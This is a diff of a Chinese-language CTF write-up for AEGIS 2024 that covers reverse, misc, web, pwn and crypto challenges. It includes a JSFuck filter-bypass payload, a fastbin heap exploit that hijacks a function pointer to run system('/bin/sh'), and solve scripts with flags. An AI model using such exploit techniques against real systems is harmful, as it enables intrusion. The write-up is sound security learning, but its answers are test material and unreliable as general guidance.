@@ -1,7 +1,5 @@
 # 神盾盃 2024
-###### tags: `CTF`
-
-[toc]
+###### tags: `CTF` `AEGIS`
 
 Player: 
 - ywc
@@ -11,21 +9,21 @@ Player:
 - l3obo
 - frostbean
 
-:::success
+---
 - [ctfd](https://aegis2024.ctfd.io/)
 - [discord](https://discord.gg/7vZKGDhc)
 - flag format: `AEGIS{}`
 - Teamname: `i'm down QQ`
 - Rank: 3/51
 - Solve: 10/21
-:::
+
 
 ## Reverse
 ### arm_E
 
 從檔案 p,q 通靈出大概是 RSA，但是公鑰 e 未知
 
-:::spoiler fibonacci (從 0 開始算)
+fibonacci (從 0 開始算)
 ```asm
  854:	d10083ff 	sub	sp, sp, #0x20
  858:	b9000fe0 	str	w0, [sp, #12]
@@ -64,9 +62,9 @@ Player:
  8dc:	910083ff 	add	sp, sp, #0x20
  8e0:	d65f03c0 	ret
 ```
-:::
 
-:::spoiler 呼叫 fibonacci(0x20) 並加上 0x84f3a
+
+呼叫 fibonacci(0x20) 並加上 0x84f3a
 ```asm
  8e4:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
  8e8:	910003fd 	mov	x29, sp
@@ -79,7 +77,6 @@ Player:
  904:	a8c17bfd 	ldp	x29, x30, [sp], #16
  908:	d65f03c0 	ret
 ```
-:::
 
 推測 e 應該是 fib(0x20) + 0x84f3a，剩下就 RSA 解密
 
@@ -96,8 +93,7 @@ Easy code with easy solution
 
 ![image](./img/aegis3.png)
 
-
-![image](./img/aegis4.png)
+![image](./img/aegis4.png)  
 First blood of the contest
 
 flag: `AEGIS{N0_5WE4T}`
@@ -109,7 +105,7 @@ stage 1 使用 python 的 `int(input)`，要組合出在指定的輸入長度下
 
 以下是各 level 的解法
 
-:::spoiler stage1
+stage1
 ```
 2
 "2"
@@ -120,11 +116,10 @@ f"""2"""
 ""f"""2"""
 f""""""f"2"
 ```
-:::
 
 stage 2 是 js，要求在 `Number` 的情況下解析出 1024，而使用以下 safeEval 的情況下解析出 532
 
-:::spoiler `safeEval`
+`safeEval`
 ```javascript
 function safeEval(input) {
     const allowedChars = /^[0-9+\-*/.\s]+$/;
@@ -136,7 +131,6 @@ function safeEval(input) {
     return new Function(`return (${input})`)();
 }
 ```
-:::
 
 解法是輸入 `001024`，在 Number 解析下是 10 進位的 1024，而 safeEval 解析出 8 進位的 532
 
@@ -149,13 +143,14 @@ abcdefgh
 ijklmnop
 qrstuvwx
 ```
+
 想辦法讓 8B 都確認在 A-X 裡頭，沒有就重來，有了後就可以確認 XY 不在正確答案  
 這時再從前三次輸入中最多正確答案的取六個搭配 XY 找出所有的 B 再慢慢試出正確答案 剩下就加上一點運氣 QQ  
 先刷首抽把 ABCDEFGH 弄成 0A0B 也是一樣意思，~~但好難刷~~
 
 Solve script when known sets of answer
-:::spoiler source code
-```python=
+
+```python
 #!/usr/bin/python3.10 -W ignore
 
 from itertools import permutations
@@ -211,28 +206,23 @@ if __name__ == "__main__":
         else:
             print("Maybe ", len(maybe_right))
 ```
-:::
-
 
 ## Web
 ### JSFBox
 
 後端擋含大小寫、底線、等號，且有使用的字元種類數量限制，推測可用 [JSFuck](https://jsfuck.com/) 解  
 以下是 payload 以及 JSFuck 產出的結果  
-:::spoiler payload
+
 payload: `res.send(fa)`
 jsf: `(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]`
 :::
 
 `AEGIS{1_4m_d0wn_f0r_qu173_7h3_j5fun_qu357_bu7_fuck_j5fuck!}`
 
-
-
 ## Pwn
 ### basicPwn
 
 - AEGIS{Sudan_IV_is_c24H20N4o_s0o0_TerribLe!!!!}
-
 
 note 題目，可以 create 可以指定 malloc 大小，另外在 create 過程中，還會 malloc 一個 0x10 的 chunk 用來存放 info() 的 function pointer，以及指向 note 的 pointer，這邊暫時把它稱為 note header
 
@@ -260,14 +250,12 @@ create note 是先 create note header(0x10) 再 create note(你輸入的數字)
 
 接著再 create 0x10 以外的 note3，他會拿走 fastbin 最尾巴的 note2 header
 
-
 ==fastbin 0x10：note1 header → note2==
 
 這時只要再 create 0x10 的 note4，note4 header 會拿到 note2，note4 會拿到 note1 header，這時就可以在 note4 寫入 system() 跟 /bin/sh 的 address，然後 view note1 就會執行 `system('/bin/sh')`
 
-
 exp.py
-```python=
+```python
 from pwn import *
 context.arch = 'amd64'
 
@@ -331,7 +319,8 @@ p.interactive()
 
 ## Crypto
 ### Choose E
-:::spoiler challenge source
+
+Challenge source
 ```python
 from Crypto.Util.number import *
 from SECRET import flag
@@ -354,7 +343,6 @@ except:
     print(f'Something is error!')
     exit()
 ```
-:::
 
 Choose 4 different e to assemble `n` and `m`  
 We can use any numbers to recover values, use the closest number for sample.  
@@ -371,8 +359,7 @@ m^{x_0} * m^{y_0} &\equiv m^{x_1} * m^{y_1} \equiv m^0 \\
 m &\equiv m^{x_1} * m^{y_0} \equiv m^{(x+1)-x}\ (mod\ n)
 \end{split}$
 
-:::spoiler
-```python=
+```python
 #!/usr/bin/python3.10 -W ignore
 
 from Crypto.Util.number import *
@@ -387,14 +374,14 @@ m = long_to_bytes(x1 * y0 % n)
 
 print(m)
 ```
-:::
 
 flag: `AEGIS{w00p5!7h3_n36471v3_3_15_d4n63r0u5_!_fc7c83}`
 
 
 ### miku
-:::spoiler challenge source
-```python=
+
+Challenge source
+```python
 from Crypto.Util.number import *
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -419,7 +406,6 @@ with open('flag.png', 'rb') as f:
         g.write(f'negi = {negi:x}\n')
         g.write(f'kotoba = {pow(bytes_to_long(kotoba), negi, miku)}')
 ```
-:::
 
 getPrime(39) will generate small prime that we can easily factorize
 
@@ -429,8 +415,8 @@ n &= \prod^{n}_{i=0}p_i \\
 \end{align*}
 $$
 
-:::spoiler solution
-```python=
+Solve script
+```python
 #!/usr/bin/python3.10 -W ignore
 
 from Crypto.Util.number import *
@@ -453,8 +439,6 @@ aes = AES.new(key, AES.MODE_CBC, bytes.fromhex(iv))
 with open("./flag.png", "wb") as f:
     f.write(aes.decrypt(bytes.fromhex(enc)))
 ```
-:::
-
 
 flag: `AEGIS{4_b3l473d_h4ppy_b1r7hd4y_70_h475un3_m1ku}`
 
@@ -462,7 +446,7 @@ flag: `AEGIS{4_b3l473d_h4ppy_b1r7hd4y_70_h475un3_m1ku}`
 
 Solved by bruteforcing, don't know how to solve ¯\\\_(ツ)_/¯
 
-```bash!
+```bash
 for i in {7680..0}; do
     echo $i;
     echo $i >> secret1;
